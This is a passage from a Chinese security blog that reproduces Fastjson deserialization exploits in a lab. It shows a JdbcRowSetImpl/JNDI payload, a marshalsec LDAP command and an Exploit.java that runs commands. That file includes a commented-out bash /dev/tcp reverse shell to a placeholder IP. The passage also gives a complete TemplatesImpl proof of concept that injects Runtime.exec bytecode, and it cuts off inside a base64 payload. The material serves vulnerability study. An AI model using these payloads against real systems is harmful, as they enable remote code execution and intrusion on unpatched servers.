<p>这时候我们是不能控制到底要反序列化为什么类型的对象的，只能开发者在代码中指定好，如这样：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/21ae2fde7d3075a1f2e5479f21fe8053.png" alt="在这里插入图片描述"><br>而如果我们在序列化的时候添加了该参数，我们则可以在反序列化的时候通过控制@type键的值来控制该序列化数据要被反序列化为什么样的对象，即调用什么类的set 方法，接下来要用到的就是找到这样一个类可以被用来完成我们想要的功能。<br>其中一个类是：com.sun.rowset.JdbcRowSetImpl<br>我们查看以下这个类，定位到setDataSource方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a2966598772acdc06ae5b39e34722680.png" alt="在这里插入图片描述"><br>这段代码首先判断了this.getDataSourceName（）是否为空，我们定位到getDataSourceName（）方法处查看一下他的返回值：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/87dc01881a8358a40c7bfe72f7d5fcf1.png" alt="在这里插入图片描述"><br>返回dataSource，是一个字符串类型，那么我们在反序列化调用set方法时dataSource首先是没有值的，也就是说this.getDataSourceName（）的返回值为null，这逻辑进入到else部分，调用了父类的setDataSourceName，并将var1传了进去。其实这一串都不重要，只需要知道反序列化的时候会自动调用setDataSourceName为DataSourceName赋值就可以了。<br>再在com.sun.rowset.JdbcRowSetImpl类中定位到setAutocommit方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8ee66d941bcb77f16736b104d5f7c0fb.png" alt="在这里插入图片描述"><br>在定位到this.connect方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b8ade61e0a47e61d179d1ac8b336e53e.png"><br>在这里我们注意到有个lookup方法，该方法就是JNDI中访问远程服务器获取远程对象的方法，其参数为服务器地址。如果其参数可控那么就可能被攻击，而this.getDataSourceName是获取DataSourceName的值得方法，那么我们只要控制了this.setDataSourceName方法的参数就可以访问我们自己的服务器了。而我们知道Fastjson在反序列化的时候会调用所有的set方法，正好可以通过setDataSourceName对DataSourceName进行赋值。于是，我们就有了这样的Fastjson序列化数据：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://localhost:1099/POC&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>这儿autoCommit好像必须设置为true，为啥我忘记了，昨天看的，待会儿去找找！！<br>漏洞的原理就是这样，接下来就是复现了，好紧张。。。。</p>
<h1 id="一次失败的复现"><a href="#一次失败的复现" class="headerlink" title="一次失败的复现"></a>一次失败的复现</h1><p>我们利用现有的靶场环境：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f1837d42ed28a8665c28ff8a57ee392.png" alt="在这里插入图片描述"><br>将含有漏洞的war包直接放到tomcat的webapps目录下，然后启动tomcat就可以了，访问下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/efdb2e55d3a0a078768e9bb6da82d399.png" alt="在这里插入图片描述"><br>出啊先helloword则代表靶场搭建完毕，然后我们去看看这个war包怎么写的：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7b75e64d29cf5cdfbb7d971f319d98d2.png" alt="在这里插入图片描述"><br>这里有两个文件，主要的逻辑在过滤器那个类中，我直接给他粘出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> spark.Spark;</span><br><span class="line"><span class="keyword">import</span> spark.servlet.SparkApplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexFilter</span> <span class="keyword">implements</span> <span class="title class_">SparkApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        Spark.get(<span class="string">&quot;/&quot;</span>, (req, res) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        Spark.post(<span class="string">&quot;/&quot;</span>, (request, response) -&gt; &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> request.body();</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(data, <span class="keyword">new</span> <span class="title class_">Feature</span>[]&#123;Feature.SupportNonPublicField&#125;);</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">            ret.put(<span class="string">&quot;success&quot;</span>, <span class="number">200</span>);</span><br><span class="line">            ret.put(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;Hello &quot;</span> + obj.get(<span class="string">&quot;name&quot;</span>) + <span class="string">&quot;, Your age is &quot;</span> + obj.get(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">            response.status(<span class="number">200</span>);</span><br><span class="line">            response.type(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ret.toJSONString();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IndexFilter</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IndexFilter</span>();</span><br><span class="line">        i.init();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到，如果请求的方法为get则返回hello word ，如果为post则对传上来的数据进行反序列化操作，并输出 你的年纪与姓名这里面有一个<br><code>new Feature[]&#123;Feature.SupportNonPublicField&#125;);             JSONObject ret = new JSONObject();             ret.put(&quot;success&quot;, 200);</code> 参数是为了让被private修饰的值也能被反序列化。<br>我们传入正常的数据：<br>get请求：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/307874e2b5c35c8af6dfb6ddaf60ff64.png" alt="在这里插入图片描述"><br>post请求：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/099df848f059bb14c7f99fcdfad49e30.png" alt="在这里插入图片描述"><br>然后传入我们构造的payload:</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e821001f94862210776e67cb368fc013.png" alt="在这里插入图片描述"><br>在操作前记得先搭建好ldap服务器，使用的工具是marshalsec，可以在gihub上找到，命令是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1/#Exploit&quot; 6666</span><br></pre></td></tr></table></figure>
<p>当靶机访问该服务器的时候，会被重定向到本机的80端口上访问Exploit.class文件，Exploit.java文件中的内容为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">      <span class="comment">//Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行了打开计算机的命令，但我的操作并没有打开计算机，据说是应为jdk版本的原因。详情见：<br><a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a><br>参考文章：<br><a href="https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">fastjson反序列化漏洞复现</a><br><a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析</title>
    <url>/archives/4187a059.html</url>
    <content><![CDATA[<p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ETemplateImpl%E5%88%A9%E7%94%A8%E9%93%BE%E6%9D%A1%E8%B7%9F%E8%B8%AA%E4%B8%8E%E5%88%86%E6%9E%90">TOC</a></p>
<p>我们知道Fastjson在进行序列化的时候会调用当前类的所有getter方法去获取所有public成员变量的值，像这样：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setAge(20);</span></span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setName(&quot;armandhenewpy&quot;);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s);</span><br><span class="line"><span class="comment">//        String s1 = &quot;&#123;\&quot;@type\&quot;:\&quot;com.armandhe.javabase.FastjsonUnserilizeTest\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;armandhenewpy\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        JSONObject jsonObject = JSON.parseObject(s1);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面代码对FastjsonUnserilizeTest类的一个对象进行了序列化，这将会调用FastjsonUnserilizeTest中的所有getter。最终的结果为：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1db44ff51eb95e9d8a305037594671d8.png" alt="在这里插入图片描述"><br>可以看到调用了getter，我们FastjsonUnserilizeTest类的代码是这样写的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getname方法！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setname方法！&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getage方法！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setage方法！&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到age的初始值为0，符合我们的输出。<br>我们在看下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setAge(20);</span></span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setName(&quot;armandhenewpy&quot;);</span></span><br><span class="line"><span class="comment">//        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span></span><br><span class="line"><span class="comment">//        System.out.println(s);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.armandhe.javabase.FastjsonUnserilizeTest\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;armandhenewpy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s1);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这时候的输出为：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ae3d41db6032e545a2d41f6cd3306b8.png" alt="在这里插入图片描述"><br>看到反序列化的时候只调用了所有setter，我们将代码变化一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setAge(20);</span></span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setName(&quot;armandhenewpy&quot;);</span></span><br><span class="line"><span class="comment">//        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span></span><br><span class="line"><span class="comment">//        System.out.println(s);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.armandhe.javabase.FastjsonUnserilizeTest\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;armandhenewpy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s1);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时的输出为：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0f871300306c9def040ce2a9d60ff77f.png" alt="在这里插入图片描述"><br>观察到使用parseObject方法进行反序列化比使用parse方法进行发序列化额外调用了所有的getter方法。这是应为parseObject方法是对parse方法的再一次封装。parse反序列化生成的是一个Object对象，而parseObject却是一个JsonObject对象，正是这个角色的装换使得parseObject多调用了一次所哟逇getter方法。<br>我们的TemplateImpl利用链条也就是利用了parseObject的这一点。我们可以跟一下parseObject方法，最后跟到了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e64c07bafaec2456193b65a3a30b034c.png" alt="在这里插入图片描述"><br>这个方法首先调用了parse进行反序列化得到一个Object对象，然后是一个三元运算法，判断obj是否是JSONObject的实例，很明显不是的，所以会调用toJSON方法，继续跟到toJSON方法里面：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c9ad0b9063671b41ca96d2601723db5f.png" alt="在这里插入图片描述"><br>调用了重载方法，继续跟到了这一步：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/20b1cb2630c86569dddb4d26e33d4c6b.png" alt="在这里插入图片描述"><br>此时查看值：</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/0a7c061ea34cc5dfacff44acb6d61e51.png" alt="在这里插入图片描述"><br>发现已经获得了所有的getter，跟到getFieldValuesMap方法里面去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/47ddde20e74f4158fc36b2fc5714a65a.png" alt="在这里插入图片描述"><br>可以看到age与name的值被取出来了，这里肯定已经调用了getter方法了，看淡上面有个getter.getPorpertyValue方法比较可以，这个应该就是获取值得方法，跟进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/102d2742a5cb87d304247b8fe38b58db.png" alt="在这里插入图片描述"><br>果然这里获取到了age的值。<br>从上面的过程来看，parseObject方法在调用的时候会调用toJSON方法将Object类型转换为JSONObject类型，在这个过程中会调用所有的getter方法。这个我们的利用链成立的前提。<br>我满来看一下我们最终利用的payload:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.util.JavaBeanInfo;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Launcher.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTemplatesImplPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">evilCode</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NotFoundException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">aDefault</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> aDefault.get(evilCode.class.getName());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(s);</span><br><span class="line">        <span class="type">String</span> <span class="variable">RandomClassName</span> <span class="operator">=</span> <span class="string">&quot;armandhe&quot;</span>+System.nanoTime();</span><br><span class="line">        ctClass.setName(RandomClassName);</span><br><span class="line">        ctClass.setSuperclass((aDefault.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> Base64.encodeBase64String(bytes);</span><br><span class="line"><span class="comment">//            System.out.println(s1);</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DESERILIZATION_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + DESERILIZATION_CLASS +<span class="string">&quot;\&quot;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"><span class="comment">//            System.out.println(jsonString);</span></span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">parserConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line"><span class="comment">//            TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//            System.out.println(JSON.toJSONString(templates, SerializerFeature.WriteClassName));</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parseObject(jsonString, Object.class, parserConfig, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//或者使用下面这个POC</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xalan.internal.xsltc.DOM;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//import java.io.IOException;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//public class Test extends AbstractTranslet &#123;</span></span><br><span class="line"><span class="comment">//    public Test() throws IOException &#123;</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    @Override</span></span><br><span class="line"><span class="comment">//    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    @Override</span></span><br><span class="line"><span class="comment">//    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public static void main(String[] args) throws Exception &#123;</span></span><br><span class="line"><span class="comment">//        Test t = new Test();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>核心部分就是jsonString这一部分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0a